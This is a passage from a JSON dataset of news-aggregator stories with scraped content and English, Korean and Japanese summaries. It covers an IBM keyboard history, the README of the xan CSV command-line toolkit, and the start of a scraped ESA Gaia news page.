      "ko": "IBM의 키보드 역사를 다룬 이 텍스트는 1890년대부터 현재까지의 주요 발전 과정을 자세히 설명하고 있습니다. \n\n먼저, 이 타임라인은 1890년대에 허먼 홀러리스가 표 계산 기계 회사를 설립하고 1901년에 최초의 키펀치에 대한 특허를 받은 것으로 시작됩니다. 이는 IBM의 미래 키보드 혁신의 기초가 되었습니다. \n\nIBM은 1924년에 여러 회사의 합병으로 설립되어 타자기와 키보드 분야의 선두주자가 되었습니다. 이후 수십 년 동안 IBM은 다른 회사를 인수하고 다양한 키보드 기술을 도입했습니다. \n\n중요한 이정표로는 1930년대 전기 타자기의 도입, 1949년 첫 번째 세대 키보드의 개발, 1980년대에 모델 F와 모델 M 키보드의 출시가 있습니다. 이 키보드들은 디자인과 기능성으로 아이코닉한 존재가 되었습니다. \n\n기술 발전 측면에서는 정전 용량 방식의 버클링 스프링 디자인과 멤브레인 키보드 등 다양한 키보드 유형이 개발되었습니다. 또한, ThinkPad 노트북에는 트랙포인트 포인팅 스틱과 같은 혁신적인 기능이 도입되었습니다. \n\n1990년대에는 IBM이 키보드 제조를 렉스마크에 매각하였고, 이후 유니컴프가 이를 인수하여 모델 M 키보드를 계속 생산하게 되었습니다. \n\n최근에는 2020년대에 유니컴프가 새로운 키보드 모델을 출시하고, 레노버가 ThinkPad 시리즈의 키보드 디자인을 지속적으로 발전시키고 있습니다. \n\n이 타임라인은 지난 세기 동안 IBM이 키보드 기술과 디자인에 미친 중요한 영향을 잘 보여줍니다.",
      "ja": "このテキストは、IBMのキーボードの歴史を詳細に示したタイムラインで、1890年代から現在までの重要な発展を強調しています。\n\nまず、1890年代にハーマン・ホレリスが集計機械会社を設立し、1901年に最初のキーパンチの特許を取得したことが紹介されています。これがIBMのキーボード革新の基盤となりました。\n\nIBMは1924年にいくつかの会社が合併して設立され、タイプライターやキーボードのリーダーとなりました。数十年の間に、IBMは他の企業を買収し、さまざまなキーボード技術を導入しました。\n\n重要なリリースとしては、1930年代に電動タイプライターが導入されたこと、1949年に最初の世代のキーボードが開発されたこと、1980年代にモデルFとモデルMのキーボードが発売され、デザインと機能性でアイコニックな存在となったことが挙げられます。\n\nさまざまなキーボードタイプも開発され、キャパシティブバッキングスプリングデザインやメンブレンキーボードが登場しました。また、ThinkPadノートパソコンにはトラックポイントというポインティングスティックが導入されました。\n\n1990年代には、IBMがキーボード製造をレックスマークに譲渡し、その後ユニコンプに移行しました。ユニコンプはモデルMキーボードの生産を続けています。\n\n最近の発展としては、2020年代にユニコンプが新しいキーボードモデルを導入し、レノボがThinkPadシリーズのキーボードデザインを進化させ続けていることが挙げられます。\n\n全体として、このタイムラインは過去100年にわたるIBMのキーボード技術とデザインへの重要な影響を捉えています。"
    }
  },
  {
    "id": "06ff5d440ab48a59",
    "title": {
      "en": "XAN: A Modern CSV-Centric Data Manipulation Toolkit for the Terminal",
      "ko": "XAN: 터미널 데이터 혁신",
      "ja": "XAN: ターミナルのデータ革命"
    },
    "type": "story",
    "url": "https://github.com/medialab/xan",
    "score": 48,
    "by": "Yomguithereal",
    "time": 1743090608,
    "content": "xan, the CSV magician\nxan is a command line tool that can be used to process CSV files directly from the shell.\nIt has been written in Rust to be as fast as possible, use as little memory as possible, and can easily handle very large CSV files (Gigabytes). It is also able to leverage parallelism (through multithreading) to make some tasks complete as fast as your computer can allow.\nIt can easily preview, filter, slice, aggregate, sort, join CSV files, and exposes a large collection of composable commands that can be chained together to perform a wide variety of typical tasks.\nxan also leverages its own expression language so you can perform complex tasks that cannot be done by relying on the simplest commands. This minimalistic language has been tailored for CSV data and is faster than evaluating typical dynamically-typed languages such as Python, Lua, JavaScript etc.\nNote that this tool is originally a fork of BurntSushi's xsv, but has been nearly entirely rewritten at that point, to fit SciencesPo's médialab use-cases, rooted in web data collection and analysis geared towards social sciences (you might think CSV is outdated by now, but read our love letter to the format before judging too quickly). xan therefore goes beyond typical data manipulation and expose utilities related to lexicometry, graph theory and even scraping.\nFinally, xan can be used to display CSV files in the terminal, for easy exploration, and can even be used to draw basic data visualisations:\n\nview command\nflatten command\n\ncategorical histogram\nscatterplot\n\ncategorical scatterplot\nhistograms\n\nparallel processing\ntime series\n\nsmall multiples (facet grid)\ngrouped view\n\ncorrelation matrix heatmap\nheatmap\n\nSummary\n\nHow to install\n\nCargo\nHomebrew (macOS)\nArch Linux\nNix\nPre-built binaries\nInstalling completions\n\nQuick tour\nAvailable commands\nGeneral flags and IO model\nExpression language reference\nCookbook\nNews\nFrequently Asked Questions\n\nHow to install\nCargo\nxan can be installed using cargo (it usually comes with Rust):\ncargo install xan\n\nYou can also tweak the build flags to make sure the Rust compiler is able to leverage all your CPU's features:\nCARGO_BUILD_RUSTFLAGS='-C target-cpu=native' cargo install xan\n\nYou can also install the latest dev version thusly:\ncargo install --git https://github.com/medialab/xan\n\nHomebrew (macOS)\nxan can be installed with Homebrew on macOS thusly:\nbrew install xan\n\nArch Linux\nYou can install xan from the extra repository using pacman:\nsudo pacman -S xan\n\nNix\nxan is packaged for Nix, and is available in Nixpkgs as of 25.05 release. To\ninstall it, you may add it to your environment.systemPackages as pkgs.xan or\nuse nix-shell to enter an ephemeral shell.\nnix-shell -p xan\n\nPre-built binaries\nPre-built binaries can be found attached to every GitHub releases.\nCurrently supported targets include:\n\nx86_64-unknown-linux-musl\nx86_64-pc-windows-gnu\n\nFeel free to open a PR to improve the CI by adding relevant targets.\nInstalling completions\nNote that xan also exposes handy automatic completions for command and header/column names that you can install through the xan completions command.\nRun the following command to understand how to install those completions:\nxan completions -h\n\nQuick tour\nLet's learn about the most commonly used xan commands by exploring a corpus of French medias:\nDownloading the corpus\ncurl -LO https://github.com/medialab/corpora/raw/master/polarisation/medias.csv\n\nDisplaying the file's headers\nxan headers medias.csv\n\n0   webentity_id\n1   name\n2   prefixes\n3   home_page\n4   start_pages\n5   indegree\n6   hyphe_creation_timestamp\n7   hyphe_last_modification_timestamp\n8   outreach\n9   foundation_year\n10  batch\n11  edito\n12  parody\n13  origin\n14  digital_native\n15  mediacloud_ids\n16  wheel_category\n17  wheel_subcategory\n18  has_paywall\n19  inactive\n\nCounting the number of rows\nxan count medias.csv\n\n478\n\nPreviewing the file in the terminal\nxan view medias.csv\n\nDisplaying 5/20 cols from 10 first rows of medias.csv\n┌───┬───────────────┬───────────────┬────────────┬───┬─────────────┬──────────┐\n│ - │ name          │ prefixes      │ home_page  │ … │ has_paywall │ inactive │\n├───┼───────────────┼───────────────┼────────────┼───┼─────────────┼──────────┤\n│ 0 │ Acrimed.org   │ http://acrim… │ http://ww… │ … │ false       │ <empty>  │\n│ 1 │ 24matins.fr   │ http://24mat… │ https://w… │ … │ false       │ <empty>  │\n│ 2 │ Actumag.info  │ http://actum… │ https://a… │ … │ false       │ <empty>  │\n│ 3 │ 2012un-Nouve… │ http://2012u… │ http://ww… │ … │ false       │ <empty>  │\n│ 4 │ 24heuresactu… │ http://24heu… │ http://24… │ … │ false       │ <empty>  │\n│ 5 │ AgoraVox      │ http://agora… │ http://ww… │ … │ false       │ <empty>  │\n│ 6 │ Al-Kanz.org   │ http://al-ka… │ https://w… │ … │ false       │ <empty>  │\n│ 7 │ Alalumieredu… │ http://alalu… │ http://al… │ … │ false       │ <empty>  │\n│ 8 │ Allodocteurs… │ http://allod… │ https://w… │ … │ false       │ <empty>  │\n│ 9 │ Alterinfo.net │ http://alter… │ http://ww… │ … │ <empty>     │ true     │\n│ … │ …             │ …             │ …          │ … │ …           │ …        │\n└───┴───────────────┴───────────────┴────────────┴───┴─────────────┴──────────┘\n\nOn unix, don't hesitate to use the -p flag to automagically forward the full output to an appropriate pager and skim through all the columns.\nReading a flattened representation of the first row\n# NOTE: drop -c to avoid truncating the values\nxan flatten -c medias.csv\n\nRow n°0\n───────────────────────────────────────────────────────────────────────────────\nwebentity_id                      1\nname                              Acrimed.org\nprefixes                          http://acrimed.org|http://acrimed69.blogspot…\nhome_page                         http://www.acrimed.org\nstart_pages                       http://acrimed.org|http://acrimed69.blogspot…\nindegree                          61\nhyphe_creation_timestamp          1560347020330\nhyphe_last_modification_timestamp 1560526005389\noutreach                          nationale\nfoundation_year                   2002\nbatch                             1\nedito                             media\nparody                            false\norigin                            france\ndigital_native                    true\nmediacloud_ids                    258269\nwheel_category                    Opinion Journalism\nwheel_subcategory                 Left Wing\nhas_paywall                       false\ninactive                          <empty>\n\nRow n°1\n───────────────────────────────────────────────────────────────────────────────\nwebentity_id                      2\n...\n\nSearching for rows\nxan search -s outreach internationale medias.csv | xan view\n\nDisplaying 4/20 cols from 10 first rows of <stdin>\n┌───┬──────────────┬────────────────────┬───┬─────────────┬──────────┐\n│ - │ webentity_id │ name               │ … │ has_paywall │ inactive │\n├───┼──────────────┼────────────────────┼───┼─────────────┼──────────┤\n│ 0 │ 25           │ Businessinsider.fr │ … │ false       │ <empty>  │\n│ 1 │ 59           │ Europe-Israel.org  │ … │ false       │ <empty>  │\n│ 2 │ 66           │ France 24          │ … │ false       │ <empty>  │\n│ 3 │ 220          │ RFI                │ … │ false       │ <empty>  │\n│ 4 │ 231          │ fr.Sott.net        │ … │ false       │ <empty>  │\n│ 5 │ 246          │ Voltairenet.org    │ … │ true        │ <empty>  │\n│ 6 │ 254          │ Afp.com /fr        │ … │ false       │ <empty>  │\n│ 7 │ 265          │ Euronews FR        │ … │ false       │ <empty>  │\n│ 8 │ 333          │ Arte.tv            │ … │ false       │ <empty>  │\n│ 9 │ 341          │ I24News.tv         │ … │ false       │ <empty>  │\n│ … │ …            │ …                  │ … │ …           │ …        │\n└───┴──────────────┴────────────────────┴───┴─────────────┴──────────┘\n\nSelecting some columns\nxan select foundation_year,name medias.csv | xan view\n\nDisplaying 2 cols from 10 first rows of <stdin>\n┌───┬─────────────────┬───────────────────────────────────────┐\n│ - │ foundation_year │ name                                  │\n├───┼─────────────────┼───────────────────────────────────────┤\n│ 0 │ 2002            │ Acrimed.org                           │\n│ 1 │ 2006            │ 24matins.fr                           │\n│ 2 │ 2013            │ Actumag.info                          │\n│ 3 │ 2012            │ 2012un-Nouveau-Paradigme.com          │\n│ 4 │ 2010            │ 24heuresactu.com                      │\n│ 5 │ 2005            │ AgoraVox                              │\n│ 6 │ 2008            │ Al-Kanz.org                           │\n│ 7 │ 2012            │ Alalumieredunouveaumonde.blogspot.com │\n│ 8 │ 2005            │ Allodocteurs.fr                       │\n│ 9 │ 2005            │ Alterinfo.net                         │\n│ … │ …               │ …                                     │\n└───┴─────────────────┴───────────────────────────────────────┘\n\nSorting the file\nxan sort -s foundation_year medias.csv | xan view -s name,foundation_year\n\nDisplaying 2 cols from 10 first rows of <stdin>\n┌───┬────────────────────────────────────┬─────────────────┐\n│ - │ name                               │ foundation_year │\n├───┼────────────────────────────────────┼─────────────────┤\n│ 0 │ Le Monde Numérique (Ouest France)  │ <empty>         │\n│ 1 │ Le Figaro                          │ 1826            │\n│ 2 │ Le journal de Saône-et-Loire       │ 1826            │\n│ 3 │ L'Indépendant                      │ 1846            │\n│ 4 │ Le Progrès                         │ 1859            │\n│ 5 │ La Dépêche du Midi                 │ 1870            │\n│ 6 │ Le Pélerin                         │ 1873            │\n│ 7 │ Dernières Nouvelles d'Alsace (DNA) │ 1877            │\n│ 8 │ La Croix                           │ 1883            │\n│ 9 │ Le Chasseur Francais               │ 1885            │\n│ … │ …                                  │ …               │\n└───┴────────────────────────────────────┴─────────────────┘\n\nDeduplicating the file on some column\n# Some medias of our corpus have the same ids on mediacloud.org\nxan dedup -s mediacloud_ids medias.csv | xan count && xan count medias.csv\n\n457\n478\n\nDeduplicating can also be done while sorting:\nxan sort -s mediacloud_ids -u medias.csv\n\nComputing frequency tables\nxan frequency -s edito medias.csv | xan view\n\nDisplaying 3 cols from 5 rows of <stdin>\n┌───┬───────┬────────────┬───────┐\n│ - │ field │ value      │ count │\n├───┼───────┼────────────┼───────┤\n│ 0 │ edito │ media      │ 423   │\n│ 1 │ edito │ individu   │ 30    │\n│ 2 │ edito │ plateforme │ 14    │\n│ 3 │ edito │ agrégateur │ 10    │\n│ 4 │ edito │ agence     │ 1     │\n└───┴───────┴────────────┴───────┘\n\nPrinting a histogram\nxan frequency -s edito medias.csv | xan hist\n\nHistogram for edito (bars: 5, sum: 478, max: 423):\n\nmedia      |423  88.49%|━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|\nindividu   | 30   6.28%|━━━╸                                                  |\nplateforme | 14   2.93%|━╸                                                    |\nagrégateur | 10   2.09%|━╸                                                    |\nagence     |  1   0.21%|╸                                                     |\n\nComputing descriptive statistics\nxan stats -s indegree,edito medias.csv | xan transpose | xan view -I\n\nDisplaying 2 cols from 14 rows of <stdin>\n┌─────────────┬───────────────────┬────────────┐\n│ field       │ indegree          │ edito      │\n├─────────────┼───────────────────┼────────────┤\n│ count       │ 463               │ 478        │\n│ count_empty │ 15                │ 0          │\n│ type        │ int               │ string     │\n│ types       │ int|empty         │ string     │\n│ sum         │ 25987             │ <empty>    │\n│ mean        │ 56.12742980561554 │ <empty>    │\n│ variance    │ 4234.530197929737 │ <empty>    │\n│ stddev      │ 65.07326792108829 │ <empty>    │\n│ min         │ 0                 │ <empty>    │\n│ max         │ 424               │ <empty>    │\n│ lex_first   │ 0                 │ agence     │\n│ lex_last    │ 99                │ plateforme │\n│ min_length  │ 0                 │ 5          │\n│ max_length  │ 3                 │ 11         │\n└─────────────┴───────────────────┴────────────┘\n\nEvaluating an expression to filter a file\nxan filter 'batch > 1' medias.csv | xan count\n\n130\n\nTo access the expression language's cheatsheet, run xan help cheatsheet. To display the full list of available functions, run xan help functions.\nEvaluating an expression to create a new column based on other ones\nxan map 'fmt(\"{} ({})\", name, foundation_year)' key medias.csv | xan select key | xan slice -l 10\n\nkey\nAcrimed.org (2002)\n24matins.fr (2006)\nActumag.info (2013)\n2012un-Nouveau-Paradigme.com (2012)\n24heuresactu.com (2010)\nAgoraVox (2005)\nAl-Kanz.org (2008)\nAlalumieredunouveaumonde.blogspot.com (2012)\nAllodocteurs.fr (2005)\nAlterinfo.net (2005)\n\nTo access the expression language's cheatsheet, run xan help cheatsheet. To display the full list of available functions, run xan help functions.\nTransform a column by evaluating an expression\nxan transform name 'split(name, \".\") | first | upper' medias.csv | xan select name | xan slice -l 10\n\nname\nACRIMED\n24MATINS\nACTUMAG\n2012UN-NOUVEAU-PARADIGME\n24HEURESACTU\nAGORAVOX\nAL-KANZ\nALALUMIEREDUNOUVEAUMONDE\nALLODOCTEURS\nALTERINFO\n\nTo access the expression language's cheatsheet, run xan help cheatsheet. To display the full list of available functions, run xan help functions.\nPerforming custom aggregation\nxan agg 'sum(indegree) as total_indegree, mean(indegree) as mean_indegree' medias.csv | xan view -I\n\nDisplaying 1 col from 1 rows of <stdin>\n┌────────────────┬───────────────────┐\n│ total_indegree │ mean_indegree     │\n├────────────────┼───────────────────┤\n│ 25987          │ 56.12742980561554 │\n└────────────────┴───────────────────┘\n\nTo access the expression language's cheatsheet, run xan help cheatsheet. To display the full list of available functions, run xan help functions. Finally, to display the list of available aggregation functions, run xan help aggs.\nGrouping rows and performing per-group aggregation\nxan groupby edito 'sum(indegree) as indegree' medias.csv | xan view -I\n\nDisplaying 1 col from 5 rows of <stdin>\n┌────────────┬──────────┐\n│ edito      │ indegree │\n├────────────┼──────────┤\n│ agence     │ 50       │\n│ agrégateur │ 459      │\n│ plateforme │ 658      │\n│ media      │ 24161    │\n│ individu   │ 659      │\n└────────────┴──────────┘\n\nTo access the expression language's cheatsheet, run xan help cheatsheet. To display the full list of available functions, run xan help functions. Finally, to display the list of available aggregation functions, run xan help aggs.\nAvailable commands\n\nhelp: Get help regarding the expression language\n\nExplore & visualize\n\ncount (c): Count rows in file\nheaders (h): Show header names\nview (v): Preview a CSV file in a human-friendly way\nflatten: Display a flattened version of each row of a file\nhist: Print a histogram with rows of CSV file as bars\nplot: Draw a scatter plot or line chart\nheatmap: Draw a heatmap of a CSV matrix\nprogress: Display a progress bar while reading CSV data\n\nSearch & filter\n\nsearch: Search for patterns in CSV data\nfilter: Only keep some CSV rows based on an evaluated expression\nslice: Slice rows of CSV file\ntop: Find top rows of a CSV file according to some column\nsample: Randomly sample CSV data\n\nSort & deduplicate\n\nsort: Sort CSV data\ndedup: Deduplicate a CSV file\nshuffle: Shuffle CSV data\n\nAggregate\n\nfrequency (freq): Show frequency tables\ngroupby: Aggregate data by groups of a CSV file\nstats: Compute basic statistics\nagg: Aggregate data from CSV file\nbins: Dispatch numeric columns into bins\n\nCombine multiple CSV files\n\ncat: Concatenate by row or column\njoin: Join CSV files\nregex-join: Fuzzy join CSV files using regex patterns\nurl-join: Join CSV files on url prefixes\nmerge: Merge multiple similar already sorted CSV files\n\nAdd, transform, drop and move columns\n\nselect: Select columns from a CSV file\ndrop: Drop columns from a CSV file\nmap: Create a new column by evaluating an expression on each CSV row\ntransform: Transform a column by evaluating an expression on each CSV row\nenum: Enumerate CSV file by preprending an index column\nflatmap: Emit one row per value yielded by an expression evaluated for each CSV row\nfill: Fill empty cells\nblank: Blank down contiguous identical cell values\n\nFormat, convert & recombobulate\n\nbehead: Drop header from CSV file\nrename: Rename columns of a CSV file\ninput: Read unusually formatted CSV data\nfixlengths: Makes all rows have same length\nfmt: Format CSV output (change field delimiter)\nexplode: Explode rows based on some column separator\nimplode: Collapse consecutive identical rows based on a diverging column\nfrom: Convert a variety of formats to CSV\nto: Convert a CSV file to a variety of data formats\nscrape: Scrape HTML into CSV data\nreverse: Reverse rows of CSV data\ntranspose (t): Transpose CSV file\n\nSplit a CSV file into multiple\n\nsplit: Split CSV data into chunks\npartition: Partition CSV data based on a column value\n\nParallel operation over multiple CSV files\n\nparallel (p): Map-reduce-like parallel computation over multiple CSV files\n\nGenerate CSV files\n\nrange: Create a CSV file from a numerical range\n\nPerform side-effects\n\neval: Evaluate/debug a single expression\nforeach: Loop over a CSV file to perform side effects\n\nLexicometry & fuzzy matching\n\ntokenize: Tokenize a text column\nvocab: Build a vocabulary over tokenized documents\ncluster: Cluster CSV data to find near-duplicates\n\nMatrix & network-related commands\n\nmatrix: Convert CSV data to matrix data\nnetwork: Convert CSV data to network data\n\nGeneral flags and IO model\nGetting help\nIf you ever feel lost, each command has a -h/--help flag that will print the related documentation.\nIf you need help about the expression language, check out the help command itself:\n# Help about help ;)\nxan help --help\n\nRegarding input & output formats\nAll xan commands expect a \"standard\" CSV file, e.g. comma-delimited, with proper double-quote escaping. This said, xan is also perfectly able to infer the delimiter from typical file extensions such as .tsv or .tab.\nIf you need to process a file with a custom delimiter, you can either use the xan input command or use the -d/--delimiter flag available with all commands.\nIf you need to output a custom CSV dialect (e.g. using ; delimiters), feel free to use the xan fmt command.\nFinally, even if most xan commands won't even need to decode the file's bytes, some might still need to. In this case, xan will expect correctly formatted UTF-8 text. Please use iconv or other utils if you need to process other encodings such as latin1 ahead of xan.\nWorking with headless CSV file\nEven if this is good practice to name your columns, some CSV file simply don't have headers. Most commands are able to deal with those file if you give the -n/--no-headers flag.\nNote that this flag always relates to the input, not the output. If for some reason you want to drop a CSV output's header row, use the xan behead command.\nRegarding stdin\nBy default, all commands will try to read from stdin when the file path is not specified. This makes piping easy and comfortable as it respects typical unix standards. Some commands may have multiple inputs (xan join, for instance), in which case stdin is usually specifiable using the - character:\n# First file given to join will be read from stdin\ncat file1.csv | xan join col1 - col2 file2.csv\n\nNote that the command will also warn you when stdin cannot be read, in case you forgot to indicate the file's path.\nRegarding stdout\nBy default, all commands will print their output to stdout (note that this output is usually buffered for performance reasons).\nIn addition, all commands expose a -o/--output flag that can be use to specify where to write the output. This can be useful if you do not want to or cannot use > (typically in some Windows shells). In which case, - as a output path will mean forwarding to stdout also. This can be useful when scripting sometimes.\nGzipped files\nxan is able to read gzipped files (having a .gz extension) out of the box.\nExpression language reference\n\nCheatsheet\nComprehensive list of functions & operators\nComprehensive list of aggregation functions\nScraping DSL\n\nCookbook\n\nMerging frequency tables, three ways\nParsing and visualizing dates with xan\nJoining files by URL prefixes\nMiscellaneous\n\nNews\nFor news about the tool's evolutions feel free to read:\n\nthe changelog\nthe xan zines\n\nFrequently Asked Questions\nHow to display a vertical bar chart?\nRotate your screen ;)",
    "summary": {
      "en": "**Summary of xan: The CSV Magician**\n\nxan is a powerful command-line tool designed for processing CSV files quickly and efficiently. Developed in Rust, it can handle large CSV files and uses multithreading for faster performance. Key features include:\n\n- **Data Manipulation**: Preview, filter, slice, aggregate, sort, and join CSV files with ease.\n- **Expression Language**: A custom language for complex operations on CSV data, which performs faster than typical scripting languages.\n- **Visualization**: Display CSV data in the terminal and create basic visualizations like histograms and scatterplots.\n\n**Installation Options**:\n- **Cargo**: Install using `cargo install xan`.\n- **Homebrew**: For macOS users, run `brew install xan`.\n- **Other package managers**: Available for Arch Linux, Nix, and pre-built binaries for various systems.\n\n**Common Commands**:\n- **Viewing and Previewing**: `xan view`, `xan headers`, `xan flatten`.\n- **Data Analysis**: `xan count`, `xan sort`, `xan dedup`, `xan frequency`.\n- **Transformations**: `xan map`, `xan transform`, `xan agg`.\n- **Visualization**: `xan hist`, `xan plot`.\n\nxan is tailored for social sciences, offering additional utilities for lexicometry and graph theory. It combines ease of use with powerful capabilities for data analysis and visualization. \n\nFor more details, users can explore the quick tour, command references, and FAQs provided with the tool.",
      "ko": "xan은 CSV 파일을 빠르고 효율적으로 처리하기 위해 설계된 강력한 명령줄 도구입니다. Rust로 개발되어 대용량 CSV 파일을 처리할 수 있으며, 멀티스레딩을 통해 성능을 향상시킵니다. 주요 기능으로는 데이터 조작, 표현 언어, 시각화가 있습니다.\n\n데이터 조작 기능을 통해 사용자는 CSV 파일을 쉽게 미리 보고, 필터링하고, 슬라이스하며, 집계하고, 정렬하고, 조인할 수 있습니다. 표현 언어는 CSV 데이터에 대한 복잡한 작업을 수행할 수 있는 맞춤형 언어로, 일반적인 스크립트 언어보다 빠른 성능을 자랑합니다. 또한, CSV 데이터를 터미널에서 표시하고 히스토그램이나 산점도와 같은 기본적인 시각화를 생성할 수 있는 기능도 제공합니다.\n\n설치 방법은 여러 가지가 있습니다. Cargo를 이용해 `cargo install xan` 명령어로 설치할 수 있으며, macOS 사용자는 `brew install xan` 명령어를 실행하면 됩니다. Arch Linux, Nix와 같은 다른 패키지 관리자에서도 사용할 수 있으며, 다양한 시스템에 맞춘 미리 빌드된 바이너리도 제공됩니다.\n\n일반적인 명령어로는 CSV 파일을 보고 미리 보는 `xan view`, 헤더를 확인하는 `xan headers`, 데이터를 평탄화하는 `xan flatten` 등이 있습니다. 데이터 분석을 위한 명령어로는 `xan count`, `xan sort`, `xan dedup`, `xan frequency`가 있으며, 변환 작업을 위해서는 `xan map`, `xan transform`, `xan agg`를 사용할 수 있습니다. 시각화 관련 명령어로는 `xan hist`, `xan plot`이 있습니다.\n\nxan은 사회 과학 분야에 맞춰 설계되어 있으며, 어휘 측정 및 그래프 이론을 위한 추가 유틸리티도 제공합니다. 사용의 용이성과 강력한 데이터 분석 및 시각화 기능을 결합한 도구입니다. 더 많은 정보는 제공된 퀵 투어, 명령어 참조 및 FAQ를 통해 확인할 수 있습니다.",
      "ja": "xanは、CSVファイルを迅速かつ効率的に処理するために設計された強力なコマンドラインツールです。Rustで開発されており、大きなCSVファイルを扱うことができ、マルチスレッドを利用してパフォーマンスを向上させています。主な機能には、データ操作、表現言語、視覚化があります。\n\nデータ操作では、CSVファイルのプレビュー、フィルタリング、スライス、集計、ソート、結合を簡単に行うことができます。表現言語は、CSVデータに対する複雑な操作を行うためのカスタム言語で、一般的なスクリプト言語よりも高速に動作します。視覚化機能では、ターミナル上でCSVデータを表示し、ヒストグラムや散布図などの基本的な視覚化を作成できます。\n\nインストール方法は複数あります。Cargoを使用する場合は「cargo install xan」と入力します。macOSユーザーは「brew install xan」を実行します。また、Arch LinuxやNix向けのパッケージマネージャーや、さまざまなシステム向けの事前ビルドされたバイナリも利用可能です。\n\n一般的なコマンドには、データの表示やプレビューを行う「xan view」、ヘッダーを表示する「xan headers」、データをフラット化する「xan flatten」があります。データ分析には「xan count」、「xan sort」、「xan dedup」、「xan frequency」を使用します。データの変換には「xan map」、「xan transform」、「xan agg」があり、視覚化には「xan hist」、「xan plot」があります。\n\nxanは社会科学向けに特化しており、語彙計量学やグラフ理論に関する追加のユーティリティも提供しています。使いやすさと強力なデータ分析・視覚化機能を兼ね備えています。詳細については、ツールに付属のクイックツアーやコマンドリファレンス、FAQを参照することができます。"
    }
  },
  {
    "id": "9ebd854186f36f8f",
    "title": {
      "en": "The disappearance of Gaia, ESA spacecraft will be turned off on 27 March 2025",
      "ko": "가이아, 2025년 3월 27일 종료!",
      "ja": "ガイア消失、2025年3月27日停止"
    },
    "type": "story",
    "url": "https://www.cosmos.esa.int/web/gaia/news",
    "score": 57,
    "by": "croes",
    "time": 1743015060,
    "content": "Athena\n\n                                                        3\n                                                        future\n\n                                                        0\n\nLISA\n\n                                                        2\n                                                        development\n\n                                                        0\n\nARIEL\n\n                                                        2\n                                                        development\n\n                                                        0\n\nProba-3\n\n                                                        2\n                                                        development\n\n                                                        0\n\nSMILE\n\n                                                        2\n                                                        development\n\n                                                        0\n\nExoMars RFM 2028\n\n                                                        2\n                                                        development\n\n                                                        0\n\nEnVision\n\n                                                        2\n                                                        development\n\n                                                        0\n\nACES\n\n                                                        2\n                                                        development\n\n                                                        0\n\nEinstein Probe\n\n                                                        2\n                                                        development\n\n                                                        0\n\nPLATO\n\n                                                        2\n                                                        development\n\n                                                        0\n\nComet Interceptor\n\n                                                        2\n                                                        development\n\n                                                        0\n\nJUICE\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nMars Express\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nEuclid\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nINTEGRAL\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nCHEOPS\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nGaia\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nExoMars 2016\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nBepiColombo\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nCluster\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nXMM-Newton\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nSolar Orbiter\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nSOHO\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nJWST\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nProba-2\n\n                                                        1\n                                                        (post-) operational\n\n                                                        0\n\nCassini Huygens\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nHinode\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nXRISM\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nAKARI\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nDouble Star\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nSuzaku\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nCoRoT\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nMicroscope\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nIRIS\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nChang'E\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nHubble\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nChandrayaan-1\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nHitomi\n\n                                                        4\n                                                        collaborative\n\n                                                        0\n\nHipparcos\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nLISA Pathfinder\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nGiotto\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nHerschel\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nEXOSAT\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nUlysses\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nCOS-B\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nSMART-1\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nVenus Express\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nIUE\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nRosetta\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nISO\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nPlanck\n\n                                                        5\n                                                        completed\n\n                                                        0\n\nSign in\n\n                    Science Missions\n\n             The European Space Agency\n\n                 Science & Technology\n\ngaia\n\nNavigation\n\n                        Home\n\n                        Data\n\n        Data access\n\n        Gaia ESA Archive\n\n        Gaia Partner Data Centres\n\n        Gaia Affliate Data Centres\n\n        Gaia data citation guidelines\n\n        FAQ on Gaia Archive and Data\n\n        Tutorials\n\n        Data Release 4\n\n        Gaia DR4 overview\n\n        Gaia DR4 content\n\n        Gaia DR4 papers\n\n        Gaia DR4 previews\n\n        Focused Product Release\n\n        Gaia FPR overview\n\n        Gaia FPR content\n\n        Gaia FPR papers\n\n        Gaia FPR Documentation\n\n        Gaia FPR known issues\n\n        Gaia FPR events\n\n        Gaia FPR stories\n\n        Updated orbits for solar system objects\n\n        Diffuse Interstellar Bands from RVS spectra\n\n        Search for gravitational lenses with Gaia\n\n        Radial velocity time series for LPVs\n\n        Long Period Variables Application\n\n        Additional data from engineering images in omega Centauri\n\n        Data Release 3\n\n        Gaia DR3 overview\n\n        Gaia DR3 content\n\n        Gaia DR3 papers\n\n        Gaia DR3 documentation\n\n        Gaia DR3 known issues\n\n        Gaia DR3 auxiliary data\n\n        Gaia DR3 software tools\n\n        GaiaXPy\n\n        